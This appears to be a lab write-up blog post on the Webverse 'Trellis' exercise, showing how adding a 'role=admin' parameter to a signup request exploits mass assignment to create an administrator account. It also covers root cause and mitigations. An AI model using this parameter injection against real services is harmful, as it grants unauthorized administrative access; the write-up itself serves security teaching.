---
title: "Mass Assignment Leading to Admin Account Creation | Trellis"
date: 2026-05-14 10:10:00 +0530
categories: [A01 - Broken Access Control, Mass Assignment]
tags: [mass assignment, insecure design, privilege escalation, burp suite, access control, webversepro, role manipulation]
platform: Webverse
author: Shivansh Sharma
image:
  path: /assets/images/posts/trellis.webp
  alt: Mass Assignment Vulnerability in Trellis Signup Flow
---

# Mass Assignment Leading to Admin Account Creation | Trellis

## Overview

Trellis is a lightweight collaboration platform designed for small remote teams. During account registration, the frontend signup form submitted only the expected user-controlled fields. However, the backend accepted additional parameters without proper validation or filtering.

By adding a hidden `role` parameter during registration, it was possible to create an administrator account directly from the public signup endpoint.

This resulted in unauthorized access to internal administrative boards containing sensitive founder-only information and the lab flag.

## Lab Link

- Lab: [DocketHive – WebVerse](https://dashboard.webverselabs-pro.com/foundational-labs/trellis)

---

## Objective

The objective of this lab was to:

- Analyze the account registration flow
- Intercept and modify signup requests
- Identify backend trust issues
- Exploit mass assignment behavior
- Escalate privileges to administrator
- Access restricted administrative content

---

## Initial Setup

The target hostname was added locally.

```bash
echo "10.100.0.30  trellis.local" | sudo tee -a /etc/hosts
```

After visiting the application, a new account registration request was intercepted using Burp Suite.

---

## Intercepting the Signup Request

The registration page was located at:

```text
http://trellis.local/signup
```

Burp Suite captured the following request:

```http
POST /signup HTTP/1.1
Host: trellis.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Origin: http://trellis.local
Referer: http://trellis.local/signup
Cookie: PHPSESSID=fd7b096a84a176774cc6471b2c94ec4a

name=Kelvin&email=kelvin%40kel.com&password=kelvin
```

The frontend only supplied the following fields:

- `name`
- `email`
- `password`

At this point, the backend behavior became the primary target for testing.

---

## Testing for Mass Assignment

An additional parameter named `role` was manually added to the request body.

Modified request:

```http
name=Kelvin&email=kelvin%40kel.com&password=kelvin&role=admin
```

The server accepted the modified request without validation or rejection.

This indicated a classic **mass assignment vulnerability**, where the backend automatically mapped user-controlled input directly into internal object properties.

Instead of enforcing a strict allowlist of acceptable fields, the application trusted all incoming parameters.

---

## Successful Privilege Escalation

After registration completed successfully, the new account possessed administrator privileges.

The administrative interface became accessible at:

```text
http://trellis.local/admin/boards
```

Inside the admin boards section, an internal founders-only board was visible.

```text
Founders / internal
```

The restricted section contained the lab flag.

```text
WEBVERSE{...}
```

---

## Proof of Exploitation

### Original Signup Request

```http
name=Kelvin&email=kelvin%40kel.com&password=kelvin
```

### Modified Signup Request

```http
name=Kelvin&email=kelvin%40kel.com&password=kelvin&role=admin
```

### Administrative Access

```text
/admin/boards
```

### Sensitive Internal Board Exposure

```text
Founders / internal
```

### Flag Disclosure

```text
WEBVERSE{...}
```

---

## Vulnerability Analysis

This issue is a textbook example of **Mass Assignment** vulnerability, also known as:

- Autobinding
- Over-posting
- Object Injection through parameter binding

The backend likely performed automatic model binding similar to:

```python
user = User(request.POST)
```

or:

```javascript
Object.assign(user, req.body)
```

Without explicit filtering, attacker-controlled parameters became trusted application attributes.

Because the application used the same internal `role` property for authorization decisions, the attacker could directly assign themselves administrator privileges during signup.

---

## Impact

This vulnerability allowed full privilege escalation from an unauthenticated user to administrator.

An attacker could potentially:

- Create arbitrary admin accounts
- Access internal team discussions
- Read sensitive business data
- Modify administrative settings
- Access private customer information
- Fully compromise platform integrity

Because the issue occurred during account creation itself, exploitation required no prior access.

---

## Root Cause Analysis

The primary issue was insecure backend parameter handling.

Contributing factors included:

- Lack of allowlist validation
- Trusting client-supplied parameters
- Direct model binding from user input
- Missing server-side role enforcement
- Insecure registration logic

The frontend attempted to hide administrative functionality, but the backend never enforced those restrictions securely.

---

## Mitigation

### Implement Allowlist Validation

Only explicitly approved fields should be accepted during registration.

Example:

```python
allowed = {
    "name": request.form["name"],
    "email": request.form["email"],
    "password": request.form["password"]
}
```

### Never Trust Client-Controlled Role Assignment

Administrative roles should only be assigned internally through secure workflows.

### Use DTOs or Validation Schemas

Avoid binding raw request bodies directly into application models.

### Enforce Server-Side Authorization

Authorization decisions should never rely on hidden frontend controls alone.

### Log Suspicious Parameter Injection

Unexpected parameters during registration should trigger security alerts or request rejection.

---

## Real-World Insight

Mass assignment vulnerabilities are extremely common in rapid-development startups and modern frameworks that support automatic object binding.

Developers often assume that hiding fields in the frontend prevents user manipulation. In reality, attackers interact directly with HTTP requests, not just visible form fields.

If backend validation is missing, hidden application properties such as:

- `role`
- `is_admin`
- `verified`
- `subscription`
- `permissions`

can often be modified directly by attackers.

This vulnerability demonstrates how a single overlooked parameter can completely bypass an application's access control model.

